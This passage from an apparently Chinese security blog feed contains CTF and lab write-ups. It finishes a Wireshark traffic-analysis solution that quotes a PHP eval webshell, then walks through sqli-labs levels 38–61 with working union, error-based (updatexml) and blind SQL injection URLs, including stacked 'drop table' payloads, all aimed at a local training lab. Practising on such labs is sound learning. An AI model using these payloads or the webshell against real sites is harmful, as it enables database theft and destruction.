这个我找得有点久，因为答案在最后，中间还有其他可以登陆上去的用户有一个还像是人事，还有两外一个好像是设么simple啥的，看了这整个包，发现simple这个账号有好几次改密码的操作，人事也登陆了几次，这些混淆都给这题提高难度，如果你真的仔细分析这个包的话就会发现，这里面黑客是大概爆破了几次，中间还尝试了一波SQL注入，而且爆破的过程都是用的admin账户，这也暗示了为什么最后的登陆的用户名是admin了，这里的话登陆成功可以看长度，对比爆破跟正常人事的登录，成功的话一般长度都是750+，没成功的话一般都是730+<br><a href="https://imgchr.com/i/Pj06j1" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/Pj06j1.md.png" alt="Pj06j1.md.png"></a><br>所以第三题的答案是<code>admin/admin!@#pass123</code></p><h4 id="4、得到黑客上传的webshell文件名是什么，内容是什么-提交webshell内容的base编码"><a href="#4、得到黑客上传的webshell文件名是什么，内容是什么-提交webshell内容的base编码" class="headerlink" title="4、得到黑客上传的webshell文件名是什么，内容是什么,提交webshell内容的base编码"></a>4、得到黑客上传的webshell文件名是什么，内容是什么,提交webshell内容的base编码</h4><p>通常webshell都会有明显的关键字比如eval、assert之类的，还有各种回调函数就不多说了。<br>我们这里也是一样的套路<br><code>ip.src == 192.168.94.59 and http contains &quot;eval&quot;</code> 一看这不太正常的文件名，有很大机会就是webshell了，而且里面的内容含有z1这样的参数很大可能性就是菜刀连接的流量，所以文件名是<code>/image/article/a.php</code><br><a href="https://imgchr.com/i/Pj02B6" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/Pj02B6.md.png" alt="Pj02B6.md.png"></a></p><p>所以这题的答案是<br><code>&lt;?php @eval([1234]);?&gt;</code>的base64编码</p><h4 id="5、黑客在robots-txt中找到的flag是什么"><a href="#5、黑客在robots-txt中找到的flag是什么" class="headerlink" title="5、黑客在robots.txt中找到的flag是什么"></a>5、黑客在robots.txt中找到的flag是什么</h4><p>正常操作<code>http contains &quot;robots.txt&quot;</code>然后追踪流就好了<br><a href="https://imgchr.com/i/Pj0I9H" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/Pj0I9H.md.png" alt="Pj0I9H.md.png"></a><br>这题的答案就是上图的flag</p><h4 id="6、黑客找到的数据库密码是多少"><a href="#6、黑客找到的数据库密码是多少" class="headerlink" title="6、黑客找到的数据库密码是多少"></a>6、黑客找到的数据库密码是多少</h4><p>对于这题的数据库操作，先把马给过滤出来，然后再从里面找他的response，因为这里黑客是通过马对数据库操作的<br>可以先标记一下<code>a.php</code>第一次出现的地方，然后过滤http一条条去看他们的response就可以了，要是想详细一点的话可以加上db等字样，这就是做题时候的一些小技巧了。。可能恰好一样的效率有点低<br><a href="https://imgchr.com/i/Pj0XE8" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/Pj0XE8.md.png" alt="Pj0XE8.md.png"></a><br>所以这题的答案就是<code>e667jUPvJjXHvEUv</code></p><h4 id="7、黑客在数据库中找到的hash-code是什么"><a href="#7、黑客在数据库中找到的hash-code是什么" class="headerlink" title="7、黑客在数据库中找到的hash_code是什么"></a>7、黑客在数据库中找到的hash_code是什么</h4><p>这个题目明显的就是说在数据库里面找到的hash_code，但是在第一个包里面使用<code>http contains &quot;hsah_code&quot;</code>只找到一个响应报文，里面什么都找不到，这时候我们别忘了有第二个包的存在，我就是经常忘了。。这种做题习惯得改改，太浮躁，一旦发现没有就不做了。。。<br>我们来对比一下两个包的协议分级，很明显第二包里面大多数都是mysql的操作，所以很大可能性就是这个包里面存在我们要的答案<br>第一个包应用层大部分都是html的响应<br><a href="https://imgchr.com/i/PjBpgs" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/PjBpgs.md.png" alt="PjBpgs.md.png"></a><br>而第二个包明显了，直接在tcp协议上执行的Mysql操作<br><a href="https://imgchr.com/i/PjB9vn" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/PjB9vn.md.png" alt="PjB9vn.md.png"></a><br>我们可以在第二个包里面用mysql的过滤，如果是想搜索执行语句的话最好这样子，如：mysql.query contains “SELECT”<br>类似的模糊匹配<br><code>mysql contains &quot;hash_code&quot;</code><br>然后随便找个response追踪流看一下，发现答案<br><a href="https://imgchr.com/i/PjBiD0" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/PjBiD0.md.png" alt="PjBiD0.md.png"></a><br>这题答案是<code>d1c029893df40cb0f47bcf8f1c3c17ac</code></p><h4 id="8、黑客破解了账号ijnu-test-com得到的密码是什么"><a href="#8、黑客破解了账号ijnu-test-com得到的密码是什么" class="headerlink" title="8、黑客破解了账号ijnu@test.com得到的密码是什么"></a>8、黑客破解了账号<a href="mailto:ijnu@test.com" target="_blank" rel="noopener">ijnu@test.com</a>得到的密码是什么</h4><p>这一题一开始我还以为答案在mail的那两个包里面，结果还是在对sql操作的那个包上面，上来就直接<code>http contains &quot;ijnu@test.com&quot;</code>啥都没发现，这题目感觉出题没说得太明白。。<br>后面就用<code>tcp contains &quot;ijnu@test.com&quot;</code>把包筛出来，并且追踪流就行了，当然这题也可以用<code>mysql contains &quot;ijnu@test.com&quot;</code> 把包筛出来<br>一样的效果<br><a href="https://imgchr.com/i/PjBV5F" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/PjBV5F.md.png" alt="PjBV5F.md.png"></a><br>这题明显密码经过MD5加密的，所以这题得去somd5上解密<br>这题的答案是<code>edc123!@#</code></p><h4 id="9、被黑客攻击的web服务器，网卡配置是是什么，提交网卡内网ip"><a href="#9、被黑客攻击的web服务器，网卡配置是是什么，提交网卡内网ip" class="headerlink" title="9、被黑客攻击的web服务器，网卡配置是是什么，提交网卡内网ip"></a>9、被黑客攻击的web服务器，网卡配置是是什么，提交网卡内网ip</h4><p>在webone的那个包里面直接搜索就可以得到<br><code>http contains &quot;eth&quot;</code><br><a href="https://imgchr.com/i/PjBm8J" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/PjBm8J.md.png" alt="PjBm8J.md.png"></a><br>或者你也可以直接从webtwo的包里面直接看到内网ip，这也对应了题目后面内网渗透之后，用vpn连接的过程<br>也就是从<code>192.168.32.189(内网地址)-&gt;10.3.3.100(连接vpn后重新分配的内网地址)</code><br>所以这题的答案就是<code>10.3.3.100</code></p><h4 id="10、黑客使用了什么账号登陆了mail系统（形式-username-password）"><a href="#10、黑客使用了什么账号登陆了mail系统（形式-username-password）" class="headerlink" title="10、黑客使用了什么账号登陆了mail系统（形式: username/password）"></a>10、黑客使用了什么账号登陆了mail系统（形式: username/password）</h4><p>既然说是mail系统那我们就在mail的两个包里面寻求答案，在mailtwo里面输入<code>http.request.method == &quot;POST&quot; and http contains &quot;password&quot;</code><br>出现很多相同username不同密码的请求，很有可能是在爆破mail系统，在mailtwo1这一个包里面同样的过滤还存在几条成立请求，对比一下时间，这应该是mailtwo还没爆破完mailtwo1这个包继续爆破，在mailtwo包里面的序号28的信息里面对应下面的几条response，发现一名叫wenwenni的人应该是登录成功的，经过了一个check的过程，</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> loginCheck = <span class="function"><span class="keyword">function</span>(<span class="params">form</span>) </span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(form.username.value == <span class="string">""</span>) &#123;</span><br><span class="line">           alert(<span class="string">"..........................."</span>);</span><br><span class="line">           form.username.focus();</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span>(form.password.value == <span class="string">""</span>) &#123;</span><br><span class="line">           alert(<span class="string">"..........................."</span>);</span><br><span class="line">           form.password.focus();</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">var</span> key_hash = CryptoJS.MD5(<span class="string">'1234567812345678'</span>);</span><br><span class="line"><span class="keyword">var</span> key = CryptoJS.enc.Utf8.pars</span><br></pre></td></tr></table></figure><p>然后回显下面的信息<br><img src="https://s1.ax1x.com/2018/08/30/PjBQDx.png" alt="PjBQDx.png"><br>所以感觉应该有这样的重点字在里面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;&#123;\&quot;success\&quot;:true&#125;&quot; and ip.addr==192.168.94.59</span><br></pre></td></tr></table></figure><p>于是乎过滤，但是第一个包里面太多了，这一题其实我也不怎么确定，为什么与这么多success的还得继续爆破下去？希望有大佬能讲一讲。。。。<br>之鞥按照常规套路，把在mailtwo1包里面的筛出来的最后一个标记一下，再过滤回http，再来<code>ctrl+shift+N</code>跳到标记处，然后往回找有关登录的请求，找到的第一个请求。。。<br><a href="https://imgchr.com/i/PjBlb6" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/PjBlb6.md.png" alt="PjBlb6.md.png"></a></p><p>那个密码需要AES解密，利用上面的算法求出key大概是。。。个人感觉这题最有难度<br><a href="http://encode.chahuo.com/" target="_blank" rel="noopener">http://encode.chahuo.com/</a></p><p>解密出来的结果跟第三题的答案一样。。。。。后来看到有人说这是社工手段，直接套第三题答案，有意思有意思。。。。</p><h4 id="11、黑客获得的vpn-ip是多少"><a href="#11、黑客获得的vpn-ip是多少" class="headerlink" title="11、黑客获得的vpn,ip是多少"></a>11、黑客获得的vpn,ip是多少</h4><p>最后一题在vpntwo这个包里面直接点击统计-&gt;端点，又学到了一种方法<br>看到发包最多的是<code>10.3.4.3</code><br><a href="https://imgchr.com/i/PjB8UO" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/PjB8UO.md.png" alt="PjB8UO.md.png"></a><br>所以这个答案就是<code>10.3.4.3</code></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>感觉流量分析还是有点套路的，第一点就是多用点contains语句，模糊匹配一下，关键字靠自己的灵活性以及分析过程得出的结论，个人感觉大部分题目会给出，比如的话有小马上传的时候，你会想到会存在关键字，比如eval,assert之类的东西吗，别人用拼接方式传的马那就另当别论了。。但是还是可以通过菜刀的一些标志来识别的，例如&gt;||&lt;之类符号，2333<br>第二就是各种自动化扫描器的指纹特征，还是得记一下，有点用，第三就是可以通过统计去发现某些ip的发包次数，从而确定可疑ip</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最做流量分析的题目感觉还是不太熟悉，所以最近几篇博客都应该都是练习流量分析的题目了，就从安恒8月赛这个应急响应讲起吧，记录一下加深印象，顺便小结一下自己的做题领悟。
    
    </summary>
    
      <category term="流量分析" scheme="0verwatch.top/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
    
      <category term="流量分析" scheme="0verwatch.top/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs实战记录(四)</title>
    <link href="0verwatch.top/sqli-labs-training-4.html"/>
    <id>0verwatch.top/sqli-labs-training-4.html</id>
    <published>2018-08-29T12:01:56.000Z</published>
    <updated>2018-08-29T12:15:56.261Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h3><p>从这一关开始就开始限制次数，而且数据库也换成了challenge，表名是随机的，<a id="more"></a>超过次数就会重新安排<br>代码审计发现是简单的单引号闭合</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM security.users WHERE id='$id' LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure><p>爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-54/?id=-1&apos; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23</span><br></pre></td></tr></table></figure><p>爆列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-54/?id=-1&apos; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;XG5G593V9H&apos;%23</span><br></pre></td></tr></table></figure><p>爆详细信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-54/?id=-1&apos; union select 1,secret_0IMA,3 from XG5G593V9H where id=1%23</span><br></pre></td></tr></table></figure><p>提交获得的信息重置刷新次数</p><h3 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h3><p>这次变成了14次<br>先构造测试一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-55/?id=1) %23</span><br></pre></td></tr></table></figure><p>爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-55/?id=-1) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() %23</span><br></pre></td></tr></table></figure><p>爆列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-55/?id=-1) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;8753JZ68TI&apos; %23</span><br></pre></td></tr></table></figure><p>爆详细信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-55/?id=-1) union select 1,secret_UL8C,3 from 8753JZ68TI %23</span><br></pre></td></tr></table></figure><p>提交重置次数</p><h3 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h3><p>构造一下<br><code>http://192.168.100.105/sqlilabs/Less-56/?id=1&quot; %23</code>回显成功后来一直拿他试结果失败了<br>看了源代码才知道原来是括号+单引号的闭合<br>找了一下原因</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM security.users WHERE id=(&apos;1&quot;#&apos;) LIMIT 0,1</span><br></pre></td></tr></table></figure><p>在数据库中执行确实能够查到数据，那么问题在哪呢？</p><p>查找资料后发现，mysql在运算过程中能够自动的把数字转化为字符串，而在比较运算中，如果是数字和字符串比较，则可以自动的把字符串转为数字，转换的时候如果首字符字符是数字，则会转换为相应的数字，例如<code>‘1”#’</code>转化为数字值为<code>1</code>，如果是<code>‘11fads’</code>则为<code>11</code>，不过必须是数字和字符串比较的时候才会转换，如果都是字符的话则不会这样。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-56/?id=-1&apos;) %23</span><br></pre></td></tr></table></figure><p>这样才对<br>爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-56/?id=-1&apos;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23</span><br></pre></td></tr></table></figure><p>爆列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-56/?id=-1&apos;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;HVL992XP27&apos;%23</span><br></pre></td></tr></table></figure><p>爆详细信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-56/?id=-1&apos;) union select 1,secret_E2BQ,3 from HVL992XP27%23</span><br></pre></td></tr></table></figure><p>提交重置次数</p><h3 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h3><p>尝试一下闭合<br><code>http://192.168.100.105/sqlilabs/Less-57?id=-1&quot; union select 1,2,3 %23</code>发现这个有回显，常规套路<br>爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-57?id=-1&quot; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() %23</span><br></pre></td></tr></table></figure><p>爆列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-57?id=-1&quot; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;YRA6E572GR&apos; %23</span><br></pre></td></tr></table></figure><p>爆详细信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-57?id=-1&quot; union select 1,secret_LA1G,3 from YRA6E572GR %23</span><br></pre></td></tr></table></figure><p>提交重置次数</p><h3 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h3><p>这一关变成了5次<br>但是一侧就测试出来是单引号的闭合<br>执行以后发现不可以用union注入。。。因为不返回任何有数据库里面的信息<br>这段代码对其进行了处理</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$unames=<span class="keyword">array</span>(<span class="string">"Dumb"</span>,<span class="string">"Angelina"</span>,<span class="string">"Dummy"</span>,<span class="string">"secure"</span>,<span class="string">"stupid"</span>,<span class="string">"superman"</span>,<span class="string">"batman"</span>,<span class="string">"admin"</span>,<span class="string">"admin1"</span>,<span class="string">"admin2"</span>,<span class="string">"admin3"</span>,<span class="string">"dhakkan"</span>,<span class="string">"admin4"</span>);</span><br><span class="line">$pass = array_reverse($unames);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Login name : '</span>. $unames[$row[<span class="string">'id'</span>]];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Password : '</span> .$pass[$row[<span class="string">'id'</span>]];</span><br></pre></td></tr></table></figure><p>下面有报错我们可以利用报错注入<br>爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-58/?id=1&apos; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+</span><br></pre></td></tr></table></figure><p>爆列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-58/?id=1&apos; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&apos;XXQT0FJQL2&apos;),0x7e),1) --+</span><br></pre></td></tr></table></figure><p>爆详细信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-58/?id=1&apos; and updatexml(1,concat(0x7e,(select secret_LVSS from XXQT0FJQL2),0x7e),1) --+</span><br></pre></td></tr></table></figure><p>提交重置次数</p><h3 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h3><p>同样的报错注入，只需要加个注释，什么单引号双引号闭合都没有<br>爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-59/?id=1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>爆列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-59/?id=1 and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&apos;CA4PGB5VU5&apos;),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>爆详细信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-59/?id=1 and updatexml(1,concat(0x7e,(select secret_O5UY from CA4PGB5VU5),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>提交重置次数</p><h3 id="Less-60"><a href="#Less-60" class="headerlink" title="Less-60"></a>Less-60</h3><p>这一次是<code>双引号+括号</code>的闭合<br>爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-60/?id=1&quot;) and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>爆列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-60/?id=1&quot;) and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&apos;ZIYD79H66Q&apos;),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>爆详细信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-60/?id=1&quot;) and updatexml(1,concat(0x7e,(select secret_JIPP from ZIYD79H66Q),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>此题完结</p><h3 id="Less-61"><a href="#Less-61" class="headerlink" title="Less-61"></a>Less-61</h3><p>这次是单引号+两个括号的闭合，也是够变态的<br>爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-61/?id=1&apos;)) and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>爆列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-61/?id=1&apos;)) and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&apos;0NCH5HWI5Q&apos;),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>爆详细信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-61/?id=1&apos;)) and updatexml(1,concat(0x7e,(select secret_6IKU from 0NCH5HWI5Q),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>完结</p><h3 id="Less-62-Less65"><a href="#Less-62-Less65" class="headerlink" title="Less-62-Less65"></a>Less-62-Less65</h3><p>都是一样的都需要盲注，但是给的次数太少，很难跑出来，等我算法学得好一点再去把脚本写出来吧</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>终于把这个SQL注入的平台的题目给做完了，最近感冒难受的一批。。。撒花~~~</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;Less-54&quot;&gt;&lt;a href=&quot;#Less-54&quot; class=&quot;headerlink&quot; title=&quot;Less-54&quot;&gt;&lt;/a&gt;Less-54&lt;/h3&gt;&lt;p&gt;从这一关开始就开始限制次数，而且数据库也换成了challenge，表名是随机的，
    
    </summary>
    
      <category term="SQL注入" scheme="0verwatch.top/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQL注入" scheme="0verwatch.top/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs实战记录(三)</title>
    <link href="0verwatch.top/sqli-labs-training-3.html"/>
    <id>0verwatch.top/sqli-labs-training-3.html</id>
    <published>2018-08-29T12:01:31.000Z</published>
    <updated>2018-08-29T12:15:59.167Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h3><p>从这一关开始其实就是堆叠注入，就是用分号连接两个不同的语句，然后执行这几条语句，进行增删改查，<a id="more"></a>但是比赛中是不大会用的，但是对于这几个环境我还是偏向union注入所以我还是以union注入的方式显示</p><p>换了mysqli的连接方式，但是换汤不换药<br>直接单引号闭合就好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-38/?id=-1&apos; union select 1,database(),3%23</span><br></pre></td></tr></table></figure><p>报错尝试一下 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-38/?id=1&apos; and updatexml(1,concat(0x7e,database(),0x7e),1)%23</span><br></pre></td></tr></table></figure><h3 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h3><p>这个题直接注释掉后面的部分就好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-39/?id=-1 union select 1,database(),3%23</span><br></pre></td></tr></table></figure><h3 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h3><p>普通的union注入就可以</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-40/?id=1234&apos;) union select 1,2,3%23</span><br></pre></td></tr></table></figure><p>也可以尝试一下盲注</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-40/?id=1&apos;) and ascii(substr(database(),1,1))&gt;114 %23</span><br></pre></td></tr></table></figure><h3 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h3><p>union注入也可以，盲注也可以<br>union注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-41/?id=-1 union select 1,database(),3%23</span><br></pre></td></tr></table></figure><p>盲注</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-41/?id=1 and ascii(substr(database(),1,1))&gt;114 %23</span><br></pre></td></tr></table></figure><h3 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h3><p>这个题目查看源码你会发现登陆页面的password是没有过滤好的，我么可以利用此处进行堆叠注入增加，我们可以利用这点直接删库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname = 0ver</span><br><span class="line">passwd = 123;drop table 0ver#</span><br></pre></td></tr></table></figure><h3 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h3><p>跟上一题一样password没有过滤<br>只是查询的语句改变了，我么需要闭合括号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname = 0ver</span><br><span class="line">passwd = 123&apos;);drop table 0ver#</span><br></pre></td></tr></table></figure><h3 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h3><p>跟上一题同样的思路，只是需要单引号闭合</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname = 0ver</span><br><span class="line">passwd = 123&apos;;drop table 0ver#</span><br></pre></td></tr></table></figure><h3 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h3><p>感觉跟43题没啥区别啊。。。</p><h3 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h3><p>从这一关开始正式进入order by注入<br>查看一下源码语句是这样的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"SELECT * FROM users ORDER BY $id"</span>;</span><br></pre></td></tr></table></figure><p>order by利用的三种方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、直接添加注入语句 ?sort=(select ******)</span><br><span class="line">2、利用一些函数，例如rand函数，?sort=rand(sql语句)，而且此处rand(true)和rand(false)是不相同的。</span><br><span class="line">3、利用and，例如?sort=1 and (加sql语句)</span><br></pre></td></tr></table></figure><p>这一题目可以直借用报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 